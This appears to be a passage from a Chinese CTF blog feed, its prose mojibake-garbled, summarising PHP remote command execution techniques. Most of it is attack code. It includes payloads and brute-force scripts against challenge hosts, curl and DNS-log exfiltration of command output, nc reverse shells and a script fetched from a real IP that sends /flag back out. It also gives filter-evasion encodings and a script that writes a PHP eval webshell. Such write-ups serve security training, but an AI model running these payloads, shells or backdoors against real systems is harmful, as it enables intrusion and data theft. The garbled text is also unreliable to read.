<p>å¦‚æœreadfileç¬¬äºŒä¸ªå‚æ•°ä¸è®¾å®šä¸ºtrueï¼Œåˆ™ä¸ä¼šå¯»æ‰¾include_pathé‡Œé¢çš„æ–‡ä»¶è¿›è¡Œè¯»å–<br>è€Œshow_sourceé»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯åŒ…å«include_pathçš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// set_include_path æˆåŠŸæ—¶è¿”å›æ—§çš„ include_path æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› falseã€‚</span><br><br><span class="hljs-comment">//é€šè¿‡set_include_pathå‡½æ•°åŒæ—¶å®ç°äº†ä¸¤ä¸ªåŠŸèƒ½</span><br><span class="hljs-comment">// 1ï¼šè®¾ç½®æ–‡ä»¶åŒ…å«è·¯å¾„ï¼Œæ–¹ä¾¿show_sourceåœ¨å…¶ä»–ç›®å½•è¿›è¡Œè¯»å–</span><br><span class="hljs-comment">// 2ï¼šæ”¾å› .:/usr/local/php</span><br><br><span class="hljs-comment">//ä¸¤æ¬¡éšæœºæ•°å–å€¼</span><br><span class="hljs-comment">// 1ï¼šç¬¬ä¸€æ¬¡å–åˆ°set_include_pathå‡½æ•°è¿”å›çš„å­—ç¬¦ä¸²ä¸­çš„/</span><br><span class="hljs-comment">// 2ï¼šç¬¬äºŒæ¬¡å–åˆ°æ ¹ç›®å½•é‡Œçš„éšæœºæ–‡ä»¶ï¼Œå–å‡ºflagè¿™ä¸ªå­—ç¬¦ä¸²äº¤ç»™show_sourceè¿›è¡Œè¯»å–</span><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-title function_ invoke__">set_include_path</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))))))));<br></code></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><br>url = <span class="hljs-string">&quot;http://d18ae616-8323-4d47-bade-5f3ee9710125.challenge.ctf.show/?code=show_source(array_rand(array_flip(scandir(array_rand(array_flip(str_split(set_include_path(dirname(dirname(dirname(getcwd())))))))))));&quot;</span><br><br><br>go = <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">while</span> go:<br>    res = requests.get(url)<br>    time.sleep(<span class="hljs-number">0.3</span>)<br><br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&quot;flag&#123;&quot;</span>) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        go = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>




<h1 id="æ— å›æ˜¾æƒ…å†µçš„å‡ ç§åˆ©ç”¨æ–¹å¼"><a href="#æ— å›æ˜¾æƒ…å†µçš„å‡ ç§åˆ©ç”¨æ–¹å¼" class="headerlink" title="æ— å›æ˜¾æƒ…å†µçš„å‡ ç§åˆ©ç”¨æ–¹å¼"></a>æ— å›æ˜¾æƒ…å†µçš„å‡ ç§åˆ©ç”¨æ–¹å¼</h1><p>é¢˜ç›®ä¸­è¾ƒå¸¸è§çš„æ˜¯<code>shell_exec</code>å‡½æ•°ï¼Œä¸<code>system</code>å‡½æ•°ç›¸æ¯”ï¼Œå‰è€…æ²¡æœ‰å›æ˜¾ç»“æœ</p>
<h2 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h2><p>å½“æœ‰å†™å…¥çš„æƒé™æ—¶ï¼Œå¯ä»¥è€ƒè™‘å°†ç»“æœå†™åˆ°æ–‡ä»¶ä¸­</p>
<p>ä¾‹å¦‚ï¼š<code>ls&gt;1.txt;</code></p>
<h2 id="dnså¤–å¸¦ä¿¡æ¯"><a href="#dnså¤–å¸¦ä¿¡æ¯" class="headerlink" title="dnså¤–å¸¦ä¿¡æ¯"></a>dnså¤–å¸¦ä¿¡æ¯</h2><p>å‡è®¾ç›®æ ‡æ²¡æœ‰å†™çš„æƒé™ï¼Œä½†æ˜¯å‡ºç½‘ï¼Œå°±å¯ä»¥è€ƒè™‘ä½¿ç”¨dnså¤–å¸¦ä¿¡æ¯ï¼Œå¸¸ç”¨çš„å¹³å°æœ‰<code>http://dnslog.cn/</code></p>
<p>ä¾‹å¦‚æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªåŸŸå<code>c9n9j5.dnslog.cn</code>ï¼Œç„¶ååœ¨é¶æœºä¸Šæ‰§è¡Œ<code>curl `whoami`.c9n9j5.dnslog.cn</code></p>
<p>åˆ·æ–°åå°±ä¼šåœ¨å¹³å°ä¸Šè¿”å›ç»“æœ</p>
<p><img src="/img/summary/rce-19.png"></p>
<h2 id="httpå¤–å¸¦ä¿¡æ¯"><a href="#httpå¤–å¸¦ä¿¡æ¯" class="headerlink" title="httpå¤–å¸¦ä¿¡æ¯"></a>httpå¤–å¸¦ä¿¡æ¯</h2><p>å®é™…ä¸Šåœ¨dnslogå¤–å¸¦ä¿¡æ¯çš„åŒæ—¶ï¼Œæœ‰è®¸å¤šä¸æ–¹ä¾¿ä¹‹å¤„ï¼Œæ¯”å¦‚ä¸æ”¯æŒæ¢è¡Œï¼Œurlä¸­æ²¡æœ‰çš„å­—ç¬¦ä¸æ˜¾ç¤ºç­‰ç­‰</p>
<p>æ‰€ä»¥å¯ä»¥ç”¨httpçš„æ–¹å¼ï¼Œæ¨èä¸€ä¸ªå¹³å°<code>https://requestrepo.com/#/</code>ï¼Œç”¨æ¥æ¥æ”¶getï¼Œpostè¯·æ±‚ç­‰</p>
<p>åœ¨é¶æœºä¸Šæ‰§è¡Œ<code>curl http://mt2dyif2.requestrepo.com/?1=`whoami` </code>ï¼Œè¿‡ä¸€ä¼šåœ¨å¹³å°ä¸Šå°±ä¼šæœ‰è¯·æ±‚è¿”å›(å­åŸŸåæ˜¯éšæœºç”Ÿæˆçš„)</p>
<p><img src="/img/summary/rce-20.png"></p>
<h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>ä¸å›æ˜¾çš„åˆ©ç”¨æ–¹å¼è‚¯å®šå°‘ä¸äº†æœ€ç»å…¸çš„åå¼¹shell</p>
<p>å¸¸è§„åå¼¹è¯­å¥ï¼š<code>nc ip port -e /bin/sh</code>ï¼Œç›‘å¬ï¼š<code>nc -lvnp port</code></p>
<p>åå¼¹çš„å§¿åŠ¿éå¸¸å¤šï¼Œä¸çŸ¥é“åˆ©ç”¨ä»€ä¹ˆæ–¹å¼æ—¶å¯ä»¥ç”¨æ¯”è¾ƒé€šç”¨çš„æ–¹å¼<code>https://your-shell.com/</code></p>
<p>åº”å¯¹ä¸€äº›è¿‡æ»¤æ—¶çš„åšæ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">// é¶æœºæ‰§è¡Œçš„å‘½ä»¤<br>sh -c <span class="hljs-string">&quot;`nc 47.99.77.52 1234`&quot;</span><br><br><br>// vps ä¼ é€’shè„šæœ¬<br>nc -lvvnp 1234 &lt; 1.sh<br><br>// 1.shå†…å®¹<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> /flag` | nc 47.99.77.52 1235<br><br>// vpsç›‘å¬1235<br>nc -lvnnp 1235<br></code></pre></td></tr></table></figure>


<h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>å½“é¶æœºä¸å‡ºç½‘ï¼Œæ²¡æœ‰å†™å…¥æƒé™ï¼Œæ²¡æœ‰å›æ˜¾æ—¶ï¼Œå¯ä»¥é‡‡ç”¨ç±»ä¼¼sqlæ—¶é—´ç›²æ³¨çš„æ–¹æ³•</p>
<p>åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯çŒœå­—ç¬¦å¦‚æœçŒœä¸­ï¼Œå°±å»¶æ—¶è‹¥å¹²ç§’ï¼Œåå¤„æ˜¯éå¸¸è€—æ—¶</p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>RCEæ€»ç»“-å‘½ä»¤æ‰§è¡Œ</title>
    <url>/posts/729e10b0/</url>
    <content><![CDATA[<p>éƒ¨åˆ†é¢˜ç›®ç¯å¢ƒ&amp;è„šæœ¬&amp;å§¿åŠ¿æ¥è‡ª<code>https://ctf.show/</code></p>
<h1 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œå‡½æ•°</h1><p>ä¸»è¦æœ‰6ç§å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œåˆ†åˆ«æ˜¯<code>system</code>,<code>passthru</code>,<code>exec</code>,<code>shell_exec</code>,<code>popen</code>,<code>pcntl_exec</code></p>
<h1 id="å‚æ•°å€¼å¯æ§"><a href="#å‚æ•°å€¼å¯æ§" class="headerlink" title="å‚æ•°å€¼å¯æ§"></a>å‚æ•°å€¼å¯æ§</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls &quot;</span>.<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>

<p>ç›´æ¥ç”¨<code>;</code>å°†å‘½ä»¤åˆ†å‰²æˆä¸¤éƒ¨åˆ†æ‰§è¡Œ</p>
<p>æˆ–è€…ç”¨<code>&amp;&amp;</code>å’Œ<code>||</code><br><code>&amp;&amp;</code>è¡¨ç¤ºå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œæ‰æ‰§è¡Œåä¸€æ¡å‘½ä»¤<br><code>||</code>è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</p>
<h1 id="å‘½ä»¤å¯æ§"><a href="#å‘½ä»¤å¯æ§" class="headerlink" title="å‘½ä»¤å¯æ§"></a>å‘½ä»¤å¯æ§</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>ä¸ä¸Šé¢˜ç±»ä¼¼</p>
<h1 id="å…¶ä»–æ–¹å¼è·³å‡ºæ§åˆ¶èŒƒå›´"><a href="#å…¶ä»–æ–¹å¼è·³å‡ºæ§åˆ¶èŒƒå›´" class="headerlink" title="å…¶ä»–æ–¹å¼è·³å‡ºæ§åˆ¶èŒƒå›´"></a>å…¶ä»–æ–¹å¼è·³å‡ºæ§åˆ¶èŒƒå›´</h1><p><code>cd /%0apwd</code> ç›¸å½“äºä¾æ¬¡æ‰§è¡Œå‘½ä»¤<code>cd /</code>å’Œ<code>pwd</code></p>
<h1 id="æ•´ä½“å¯æ§"><a href="#æ•´ä½“å¯æ§" class="headerlink" title="æ•´ä½“å¯æ§"></a>æ•´ä½“å¯æ§</h1><h2 id="é»‘åå•è¿‡æ»¤"><a href="#é»‘åå•è¿‡æ»¤" class="headerlink" title="é»‘åå•è¿‡æ»¤"></a>é»‘åå•è¿‡æ»¤</h2><p>æ¯”èµ›ä¸­è¾ƒä¸ºå¸¸è§çš„ä¸€ç§ç±»å‹ï¼Œå°†å…³é”®è¯æ›¿æ¢æˆç©ºæˆ–å…¶ä»–å­—ç¬¦<br>å¦‚æœåªæ›¿æ¢æˆç©ºå¯ä»¥åˆ©ç”¨åŒå†™ç»•è¿‡ï¼Œå¦‚æœæ˜¯æ›¿æ¢æˆå­—ç¬¦é‚£ä¹ˆå¯ä»¥ç”¨base64ç¼–ç ç»•è¿‡æˆ–è€…æ‹¼æ¥å˜é‡</p>
<p>å¸¸è§çš„è¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼š<code>cat</code>,<code>tac</code>,<code>od</code>,<code>nl</code>,<code>less</code>,<code>more</code>,<code>sed p</code>,<code>head</code>,<code>tail</code>,<code>sort</code>,<code>uniq</code>,<code>file -f</code>,<code>date -f</code><br>å¸¸è§çš„åˆ—ç›®å½•çš„å‘½ä»¤ï¼š<code>ls</code>,<code>du</code><br>å¸¸ç”¨çš„è¿˜æœ‰é€šé…ç¬¦<code>*</code>å’Œ<code>?</code></p>
<p>é»‘åå•è¿˜å¯ä»¥é‡‡ç”¨ä¸€äº›ä¸å½±å“æ‰§è¡Œçš„ç‰¹å®šç¬¦å·éš”å¼€æ£€æµ‹çš„å…³é”®å­—</p>
<p>æ¯”å¦‚</p>
<p><code>cat /flag</code>â€“&gt;<code>ca&#39;&#39;t /flag</code>â€“&gt;<code>ca&quot;&quot;t /flag</code>â€“&gt;<code>ca\t /flag</code>â€“&gt;<code>ca$1t /flag</code>â€“&gt;<code>ca$IFS$1t /flag</code></p>
<p>æˆ–è€…æ­£åˆ™ï¼Œ<code>[^a]ä»£è¡¨ä¸æ˜¯açš„å…¶ä»–å­—ç¬¦</code></p>
<p><code>more [^a][^a][^m][^b]</code></p>
<h2 id="ç¬¦å·è¿‡æ»¤"><a href="#ç¬¦å·è¿‡æ»¤" class="headerlink" title="ç¬¦å·è¿‡æ»¤"></a>ç¬¦å·è¿‡æ»¤</h2><p>ç¬¦å·è¿‡æ»¤ä¹Ÿéå¸¸å¸¸è§</p>
<p>æ¯”å¦‚å¯ä»¥ç”¨<code>&lt;&gt;</code>,<code>$&#123;IFS&#125;</code>,<code>$IFS$9</code>,<code>%09</code>,<code>%0b</code>,<code>%0c</code>ç­‰ä»£æ›¿ç©ºæ ¼</p>
<p>å†è€…ï¼Œå¯ä»¥åˆ©ç”¨å˜é‡æ¥æˆªå–</p>
<p>æ¯”å¦‚é€šè¿‡<code>env</code>å‘½ä»¤è·å–åˆ°äº†å¦‚ä¸‹å˜é‡</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgi<br>USER=www-data<br>HOSTNAME=f3f5c6c3e3ee<br>PHP_INI_DIR=/usr/local/etc/php<br>SHLVL=2<br>HOME=/home/www-data<br>PHP_LDFLAGS=-Wl,-O1 -pie<br>PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_MD5=<br>PHP_VERSION=7.3.22<br>GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D<br>PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_ASC_URL=https://www.php.net/distributions/php-7.3.22.tar.xz.asc<br>PHP_URL=https://www.php.net/distributions/php-7.3.22.tar.xz<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>PHPIZE_DEPS=autoconf 		dpkg-dev dpkg 		file 		g++ 		gcc 		libc-dev 		make 		pkgconf 		re2c<br>PWD=/var/www/html<br>PHP_SHA256=0e66606d3bdab5c2ae3f778136bfe8788e574913a3d8138695e54d98562f1fb5<br>FLAG=not_flag<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥é€šè¿‡<code>$&#123;PHPIZE_DEPS:9:1&#125;</code>æˆ–è€…<code>$&#123;PHP_EXTRA_CONFIGURE_ARGS:12:1&#125;</code>è¡¨ç¤ºç©ºæ ¼</p>
<h1 id="æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ"><a href="#æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ"></a>æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|[0-9]/i&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç½‘é¡µï¼Œå¼ºåˆ¶ä¸Šä¼ ï¼Œåˆ©ç”¨<code>?</code>åŒ¹é…æ–‡ä»¶æ¥rce</p>
<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080/?cmd=.%20/???/????????[@-[]&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>æŠ“åŒ…çˆ†ç ´ï¼Œç”¨<code>[@-[]</code>æ¥åŒ¹é…å¤§å†™å­—æ¯ï¼Œå¯ä»¥å¢åŠ è¯»åˆ°çš„æ¦‚ç‡</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">POST /?cmd=.%20/???/????????[@-[] HTTP/1.1<br>Host: 15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080<br>Content-Length: 421<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>Origin: http://192.168.1.17<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIoD8zFE5URcUFT3b<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Referer: http://192.168.1.17/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Connection: close<br><br>------WebKitFormBoundaryIoD8zFE5URcUFT3b<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;<br>Content-Type: text/html<br><br><br>whoami<br>------WebKitFormBoundaryIoD8zFE5URcUFT3b--<br><br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/rce-1.png"></p>
<h1 id="æ•°å­—å‘½ä»¤æ‰§è¡Œ"><a href="#æ•°å­—å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="$æ•°å­—å‘½ä»¤æ‰§è¡Œ"></a>$æ•°å­—å‘½ä»¤æ‰§è¡Œ</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$white_list</span> = [<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>];<br></code></pre></td></tr></table></figure>

<blockquote>
<p>linuxä¸­ä½¿ç”¨$â€™xxxâ€™ï¼ˆxxxä¸ºå­—ç¬¦çš„å…«è¿›åˆ¶ï¼‰çš„å½¢å¼å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç </p>
</blockquote>
<p>ä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$<span class="hljs-string">&#x27;\154\163&#x27;</span>  <span class="hljs-comment">//ls</span><br>$<span class="hljs-string">&#x27;\143\141\164&#x27;</span>&lt;$<span class="hljs-string">&#x27;\57\146\154\141\147&#x27;</span>  <span class="hljs-comment">// cat&lt;/flag</span><br></code></pre></td></tr></table></figure>

<p>æ„é€ è„šæœ¬<a href="https://github.com/ProbiusOfficial/bashFuck">bashFuck</a></p>
<h1 id="é•¿åº¦é™åˆ¶"><a href="#é•¿åº¦é™åˆ¶" class="headerlink" title="é•¿åº¦é™åˆ¶"></a>é•¿åº¦é™åˆ¶</h1><h2 id="7å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ"><a href="#7å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="7å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ"></a>7å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ</h2><h3 id="webç›®å½•å¯å†™"><a href="#webç›®å½•å¯å†™" class="headerlink" title="webç›®å½•å¯å†™"></a>webç›®å½•å¯å†™</h3><p>å¯å†™çš„æƒ…å†µä¸»è¦åˆ©ç”¨<code>&gt;</code>å†™å…¥shellåˆ°æ–‡ä»¶åä¸­ï¼Œç„¶ååˆ©ç”¨<code>ls -t</code>å‘½ä»¤æ’åºï¼Œå†™å…¥æ–‡ä»¶åç”¨<code>.</code>æ‰§è¡Œã€‚å…·ä½“æ€è·¯å¦‚ä¸‹</p>
<p>åœ¨<code>linux</code>ä¸­ï¼Œå¯ä»¥åˆ©ç”¨<code>&gt;aa</code>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶åå°±æ˜¯<code>aa</code></p>
<p><img src="/img/summary/rce-2.png"></p>
<p>æ‰§è¡Œä¸€æ¬¡<code>ls -t&gt;0</code>ï¼Œç„¶å<code>cat 0</code>ï¼Œä¼šå‘ç°æ–‡ä»¶ä¸­æŒ‰ç…§åˆ›å»ºæ–‡ä»¶çš„å…ˆåé¡ºåºè¿›è¡Œäº†æ’åºï¼Œé‚£ä¹ˆå¦‚æœå°†é‡Œé¢çš„å†…å®¹æ›¿æ¢æˆæ¶æ„çš„ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åæ‰§è¡Œï¼Œä¸å°±èƒ½rceäº†å—</p>
<p><img src="/img/summary/rce-3.png"></p>
<p>ä¸ºäº†é¿å…ç¬¦å·çš„åŸå› å¯¼è‡´å†™å…¥å¤±è´¥ï¼Œå…ˆæŠŠä¸€å¥è¯æœ¨é©¬è½¬æˆbase64å½¢å¼<br><code>&lt;?php eval($_GET[1]);</code></p>
<p><code>PD9waHAgZXZhbCgkX0dFVFsxXSk7</code></p>
<p><code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p>
<p>ç„¶åå¯¹è¦æ‰§è¡Œçš„å‘½ä»¤è¿›è¡Œåˆ†å‰²ï¼Œä¸è¶…è¿‡7ä¸ªä¸€ç»„ï¼Œæ³¨æ„æ¯ç»„åé¢åŠ ä¸ª<code>\</code>ï¼Œåœ¨linuxä¸­è¡¨ç¤ºä¸€è¡Œæœªè¾“å…¥å®Œ</p>
<p>æœ€å<code>0</code>æ–‡ä»¶ä¸­åº”è¯¥æ˜¯å¦‚ä¸‹å†…å®¹</p>
<p><img src="/img/summary/rce-4.png"></p>
<p>æ‰§è¡Œ<code>. 0</code>ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ª<code>1.php</code></p>
<p>æ•´åˆè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:01</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://75026f50-dfd3-4928-9a7c-c1d59c860cb3.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;hp&quot;</span>,<br><span class="hljs-string">&quot;&gt;1.p\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;d\\&gt;\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;\\ -\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;e64\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bas\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;7\\|\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XSk\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;Fsx\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;dFV\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;kX0\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bCg\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XZh\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;AgZ\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;waH\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;PD9\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;o\\ \\&quot;</span>,<br><span class="hljs-string">&quot;&gt;ech\\&quot;</span>,<br><span class="hljs-string">&quot;ls -t&gt;0&quot;</span>,<br><span class="hljs-string">&quot;. 0&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;.1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br>	check()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>




<h3 id="webç›®å½•ä¸å¯å†™"><a href="#webç›®å½•ä¸å¯å†™" class="headerlink" title="webç›®å½•ä¸å¯å†™"></a>webç›®å½•ä¸å¯å†™</h3><p>æ—¢ç„¶å½“å‰ç›®å½•ä¸å¯å†™ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨å¯å†™çš„ç›®å½•ï¼Œæ¯”å¦‚phpçš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•<code>/tmp/</code></p>
<p>è¿™æ ·æˆ‘ä»¬å¯ä»¥åˆ©ç”¨phpçš„æ–‡ä»¶å­˜å‚¨æœºåˆ¶å¼ºè¡Œä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå†…å®¹æ˜¯åå¼¹shellçš„è¯­å¥ï¼Œç„¶ååˆ©ç”¨<code>. /t*/*</code>åŒ¹é…æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å¹¶æ‰§è¡Œï¼Œåˆšå¥½7ä¸ªå­—ç¬¦</p>
